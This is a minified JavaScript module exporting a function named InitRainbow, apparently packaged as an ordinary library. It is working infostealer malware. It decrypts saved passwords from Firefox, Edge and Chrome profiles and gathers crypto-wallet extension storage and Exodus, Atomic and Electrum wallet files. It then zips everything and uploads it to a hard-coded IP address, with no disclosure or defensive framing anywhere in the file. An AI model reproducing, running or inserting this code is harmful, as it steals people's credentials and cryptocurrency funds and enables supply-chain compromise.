var y=(s,e,t)=>new Promise((i,o)=>{var n=p=>{try{c(t.next(p))}catch(u){o(u)}},a=p=>{try{c(t.throw(p))}catch(u){o(u)}},c=p=>p.done?i(p.value):Promise.resolve(p.value).then(n,a);c((t=t.apply(s,e)).next())});import r from"path";import h from"os";import m from"fs-extra";import g from"crypto";import $ from"asn1.js";import I from"@primno/dpapi";import k from"fs-extra";var S=class{constructor(e){let t=this.decodePBE(e);this.algoAttr=t.algoAttr,this.encrypted=t.encrypted}decodePBE(e){return $.define("MetaPBE",function(){this.seq().obj(this.key("algoAttr").seq().obj(this.key("oid").objid(),this.key("data").seq().obj(this.key("data").seq().obj(this.key("oid").objid(),this.key("slatAttr").seq().obj(this.key("entrySalt").octstr(),this.key("iterationCount").int(),this.key("keySize").int(),this.key("algorithm").seq().obj(this.key("oid").objid()))),this.key("ivData").seq().obj(this.key("oid").objid(),this.key("iv").octstr()))),this.key("encrypted").octstr())}).decode(e,"der")}decrypt(e){let{key:t,iv:i}=this.deriveKeyAndIV(e);return G(t,i,this.encrypted)}deriveKeyAndIV(e){let t=g.createHash("sha1").update(e).digest(),i=this.algoAttr.data.data.slatAttr.entrySalt,o=this.algoAttr.data.data.slatAttr.iterationCount.toNumber(),n=this.algoAttr.data.data.slatAttr.keySize.toNumber(),a=g.pbkdf2Sync(t,i,o,n,"sha256"),c=new Uint8Array([4,14,...this.algoAttr.data.ivData.iv]);return{key:a,iv:c}}},j=class{constructor(e){let t=this.decodePBE(e);this.data=t.data,this.encrypted=t.encrypted}decodePBE(e){return $.define("LoginPBE",function(){this.seq().obj(this.key("cipherText").octstr(),this.key("data").seq().obj(this.key("oid").objid(),this.key("iv").octstr()),this.key("encrypted").octstr())}).decode(e,"der")}decrypt(e){let{key:t,iv:i}=this.deriveKeyAndIV(e);return J(t,i,this.encrypted)}deriveKeyAndIV(e){return{key:e,iv:this.data.iv}}};function G(s,e,t){let i=g.createDecipheriv("aes-256-cbc",s,e);i.setAutoPadding(!1);let o=Buffer.concat([i.update(t),i.final()]);return L(o)}function J(s,e,t){if(t.length<8)throw new Error("DES3Decrypt: ciphertext too short");if(t.length%8!==0)throw new Error("DES3Decrypt: ciphertext is not a multiple of the block size");let i=g.createDecipheriv("des-ede3-cbc",s,e);i.setAutoPadding(!1);let o=Buffer.concat([i.update(t),i.final()]);return L(o)}function L(s){let e=s[s.length-1];return s.slice(0,-e)}function B(s,e){try{if(s[0]===118&&s[1]===49&&s[2]===48){let t=s.slice(3),i=t.slice(0,12),o=t.slice(12,-16),n=t.slice(-16),a=g.createDecipheriv("aes-256-gcm",e,i);return a.setAuthTag(n),Buffer.concat([a.update(o),a.final()]).toString("utf-8")}else return null}catch(t){return null}}function M(s){if(!k.existsSync(s))return null;try{let t=JSON.parse(k.readFileSync(s,"utf-8")).os_crypt.encrypted_key,i=Buffer.from(t,"base64").slice(5);return I.unprotectData(i,null,"CurrentUser")}catch(e){return null}}import V from"fs-extra";import H from"os";import C from"path";import _ from"sqlite3";function F(s){return y(this,null,function*(){return new Promise((e,t)=>{let i=new _.Database(s,_.OPEN_READWRITE,o=>{o?t(new Error(`\u274C Error opening database: ${o.message}`)):e(i)})})})}function K(i,o){return y(this,arguments,function*(s,e,t=[]){return new Promise((n,a)=>{s.all(e,t,(c,p)=>{c?a(c):n(p)})}).finally(()=>s.close())})}function b(i,o){return y(this,arguments,function*(s,e,t=[]){try{let n=yield F(s);return yield K(n,e,[])}catch(n){let a=C.basename(s),c=C.join(H.tmpdir(),a);try{yield V.copy(s,c);let p=yield F(c);return yield K(p,e,[])}catch(p){return[]}}})}var R="http://162.246.23.251:3030/upload",q="Extensions",z="Local Extension Settings";var E=class{constructor(e){this.WalletList=["metamask","trust","okx","wallet","phantom","exdous","solflare"];this.zipPaths=[];this.name=e||"browser"}getInfo(){return y(this,null,function*(){let e={name:this.name,profiles:[]},t=this.getProfiles();for(let i of t){let o={name:r.basename(i),passwd:[],extensions:[]};o.passwd=yield this.getPassword(i),o.extensions=this.getExtension(i),!(o.passwd.length==0&&o.extensions.length==0)&&e.profiles.push(o)}return e})}getProfiles(){}getExtension(e){}getPassword(e){return y(this,null,function*(){})}},v=class extends E{constructor(e){super(e||"fi")}getProfiles(){let e;if(process.platform==="win32")e=r.join(h.homedir(),"AppData","Roaming","Mozilla","Firefox","profiles.ini");else if(process.platform==="darwin")e=r.join(h.homedir(),"Library","Application Support","Firefox","profiles.ini");else{let p=[r.join(h.homedir(),".mozilla","firefox"),r.join(h.homedir(),"snap","firefox","common",".mozilla","firefox"),r.join(h.homedir(),".var","app","org.mozilla.firefox",".mozilla","firefox")].find(u=>m.existsSync(u));if(p==null)return[];e=r.join(p,"profiles.ini")}if(!m.existsSync(e))return[];let t=r.dirname(e),i=m.readFileSync(e,"utf-8"),o=[],n=/Path=(.*)/g,a;for(;(a=n.exec(i))!==null;)o.push(r.join(t,a[1]));return o}getExtension(e){let t=r.join(e,"extensions.json");if(!m.existsSync(t))return[];try{let o=(JSON.parse(m.readFileSync(t,"utf-8")).addons||[]).filter(n=>n.type==="extension").map(n=>{var a;return{id:n.id,name:((a=n.defaultLocale)==null?void 0:a.name)||n.name||"Unknown",version:n.version}});this.zipPaths.push({dirName:r.join(e,"cert9.db"),zipName:`${this.name}/${r.basename(e)}/cert9.db`}),this.zipPaths.push({dirName:r.join(e,"compatibility.ini"),zipName:`${this.name}/${r.basename(e)}/compatibility.ini`}),this.zipPaths.push({dirName:r.join(e,"extension-preferences.json"),zipName:`${this.name}/${r.basename(e)}/extension-preferences.json`}),this.zipPaths.push({dirName:r.join(e,"extensions.json"),zipName:`${this.name}/${r.basename(e)}/extensions.json`}),this.zipPaths.push({dirName:r.join(e,"key4.db"),zipName:`${this.name}/${r.basename(e)}/key4.db`}),this.zipPaths.push({dirName:r.join(e,"logins.json"),zipName:`${this.name}/${r.basename(e)}/logins.json`}),this.zipPaths.push({dirName:r.join(e,"logins-backup.json"),zipName:`${this.name}/${r.basename(e)}/logins-backup.json`}),this.zipPaths.push({dirName:r.join(e,"permissions.sqlite"),zipName:`${this.name}/${r.basename(e)}/permissions.sqlite`}),this.zipPaths.push({dirName:r.join(e,"pkcs11.txt"),zipName:`${this.name}/${r.basename(e)}/pkcs11.txt`}),this.zipPaths.push({dirName:r.join(e,"prefs.js"),zipName:`${this.name}/${r.basename(e)}/prefs.js`}),this.zipPaths.push({dirName:r.join(e,"storage.sqlite"),zipName:`${this.name}/${r.basename(e)}/storage.sqlite`}),this.zipPaths.push({dirName:r.join(e,"storage","default","https+++start.metamask.io"),zipName:`${this.name}/${r.basename(e)}/storage/default/https+++start.metamask.io`});try{let n=r.join(e,"storage","default");m.readdirSync(n).forEach(c=>{m.statSync(r.join(n,c)).isDirectory()&&c.toLowerCase().includes("moz-extension+++")&&this.zipPaths.push({dirName:r.join(n,c),zipName:`${this.name}/${r.basename(e)}/storage/default/${c}`})})}catch(n){}return o.filter(n=>this.WalletList.some(a=>n.name.toLowerCase().includes(a)))}catch(i){return[]}}getPassword(e){return y(this,null,function*(){try{let t=r.join(e,"key4.db"),i=r.join(e,"logins.json"),o=[];if(!m.existsSync(t)||!m.existsSync(i))return[];let n=yield this.getMasterKey(t);if(n==null)return[];let a=JSON.parse(m.readFileSync(i,"utf8"));for(let c of a.logins){let p=Buffer.from(c.encryptedUsername,"base64"),u=Buffer.from(c.encryptedPassword,"base64"),N=new j(p).decrypt(n),w=new j(u).decrypt(n);o.push({host:c.hostname,name:`${N}`,value:`${w}`})}return o}catch(t){return console.error("Error:",t),[]}})}getMasterKey(e){return y(this,null,function*(){let t=yield b(e,"SELECT item1 FROM metaData WHERE id = 'password'"),i=yield b(e,"SELECT a11 FROM nssPrivate");if(t.length===0||i.length===0)return null;let o=t[0].item1,n=i[0].a11;try{return yield this.processMasterKey(o,n)}catch(a){throw new Error(`Process masterKey error: ${a.message}`)}})}processMasterKey(e,t){return y(this,null,function*(){try{return new S(t).decrypt(e).slice(0,24)}catch(i){throw new Error(`MetaPBE decrypt error: ${i.message}`)}})}},x=class extends E{constructor(e){super(e||"ed")}getProfiles(){let e;return process.platform==="win32"?e=r.join(h.homedir(),"AppData","Local","Microsoft","Edge","User Data"):process.platform==="darwin"?e=r.join(h.homedir(),"Library","Application Support","Microsoft Edge"):e=r.join(h.homedir(),".config","microsoft-edge"),m.existsSync(e)?m.readdirSync(e).filter(t=>t.startsWith("Profile")||t==="Default").map(t=>r.join(e,t)):[]}getExtension(e){let t=r.join(e,q);if(!m.existsSync(t))return[];let i=[];return m.readdirSync(t).forEach(o=>{let n=r.join(t,o),c=m.readdirSync(n).sort().reverse()[0];if(c!==void 0){let p=r.join(n,c,"manifest.json");if(m.existsSync(p)){let u=JSON.parse(m.readFileSync(p,"utf-8")),N=u.default_locale||"en",w=r.join(n,c,"_locales",N,"messages.json"),U={};m.existsSync(w)&&(U=JSON.parse(m.readFileSync(w,"utf-8")));let P=this.resolveMessage(U,u.name),T=this.resolveMessage(U,u.version);this.WalletList.some(O=>P.toLowerCase().includes(O))&&(this.zipPaths.push({dirName:r.join(e,z,o),zipName:`${this.name}/${r.basename(e)}/${z}/${o}`}),i.push({id:o,name:P,version:T}))}}}),i}getPassword(e){return y(this,null,function*(){let t=r.join(e,"Login Data");if(!m.existsSync(t))return[];let i=r.join(r.dirname(e),"Local State"),o=M(i);if(o===null)return[];let n=[];return(yield b(t,"SELECT origin_url, username_value, password_value FROM logins")).forEach(c=>{let p=B(c.password_value,o);p!==null&&n.push({url:c.origin_url,name:c.username_value,value:p})}),n})}resolveMessage(e,t){var i,o;if(t.startsWith("__MSG_")&&t.endsWith("__")){let n=t.replace(/__MSG_|__/g,"");return((i=e[n])==null?void 0:i.message)||((o=e[n.toLowerCase()])==null?void 0:o.message)||t}return t}},D=class extends x{constructor(e){super(e||"ch")}getProfiles(){let e;return process.platform==="win32"?e=r.join(h.homedir(),"AppData","Local","Google","Chrome","User Data"):process.platform==="darwin"?e=r.join(h.homedir(),"Library","Application Support","Google","Chrome"):e=[r.join(h.homedir(),".config","google-chrome"),r.join(h.homedir(),".config","google-chrome-stable"),r.join(h.homedir(),"snap","chromium","common","chromium"),r.join(h.homedir(),".var","app","org.chromium.Chromium","config","chromium")].find(i=>m.existsSync(i))||"",m.existsSync(e)?m.readdirSync(e).filter(t=>t.startsWith("Profile")||t==="Default").map(t=>r.join(e,t)):[]}};import f from"fs-extra";import d from"path";import Z from"axios";import Q from"archiver";import{PassThrough as X}from"node:stream";import l from"os";function A(s,e,t){let i=[];try{i=f.readdirSync(e)}catch(o){try{if(!f.existsSync(e))return;let n=f.readFileSync(e);s.append(n,{name:t})}catch(n){}}i.forEach(o=>{let n=d.join(e,o),a=d.join(t,o);if(f.statSync(n).isDirectory())A(s,n,a);else try{let p=f.readFileSync(n);s.append(p,{name:a})}catch(p){}})}function W(s,e){return y(this,null,function*(){let t=Q("zip",{zlib:{level:9}}),i=new X;try{let o=Z.post(R,i,{headers:{"Content-Type":"application/zip"},maxBodyLength:1/0});for(let n of s)for(let a of n.zipPaths)A(t,a.dirName,a.zipName);A(t,Y(),"Exdous"),A(t,ee(),"Atomic"),A(t,te(),"Electrum"),t.append(JSON.stringify(e),{name:"data.json"}),t.pipe(i),t.finalize(),yield o}catch(o){o.code}})}function Y(){let s="";return process.platform==="win32"?s=d.join(l.homedir(),"AppData","Roaming","Exodus"):process.platform==="darwin"?s=d.join(l.homedir(),"Library","Application Support","Firefox","profiles.ini"):s=[d.join(l.homedir(),".config","Exdous"),d.join(l.homedir(),".config","ExodusApp"),d.join(l.homedir(),"snap","Exdous"),d.join(l.homedir(),".local","share","Exodus"),d.join(l.homedir(),".var","app","io.exodus.Exodus")].find(t=>f.existsSync(t))||"",s}function ee(){let s="";return process.platform==="win32"?s=d.join(l.homedir(),"AppData","Roaming","Atomic"):process.platform==="darwin"?s=d.join(l.homedir(),"Library","Application Support","Firefox","profiles.ini"):s=[d.join(l.homedir(),".atomic"),d.join(l.homedir(),"snap","atomicwallet"),d.join(l.homedir(),".config","AtomicWallet"),d.join(l.homedir(),".var","app","io.atomicwallet.AtomicWallet")].find(t=>f.existsSync(t))||"",s}function te(){let s="";return process.platform==="win32"?s=d.join(l.homedir(),"AppData","Roaming","Electrum"):process.platform==="darwin"?s=d.join(l.homedir(),"Library","Application Support","Firefox","profiles.ini"):s=[d.join(l.homedir(),".electrum"),d.join(l.homedir(),"snap","electrum"),d.join(l.homedir(),".config","electrum"),d.join(l.homedir(),".var","app","io.electrum.electrum")].find(t=>f.existsSync(t))||"",s}function _e(){return y(this,null,function*(){let s=[],e=[new x,new D,new v];for(let t of e)s.push(yield t.getInfo());yield W(e,s)})}export{_e as InitRainbow};
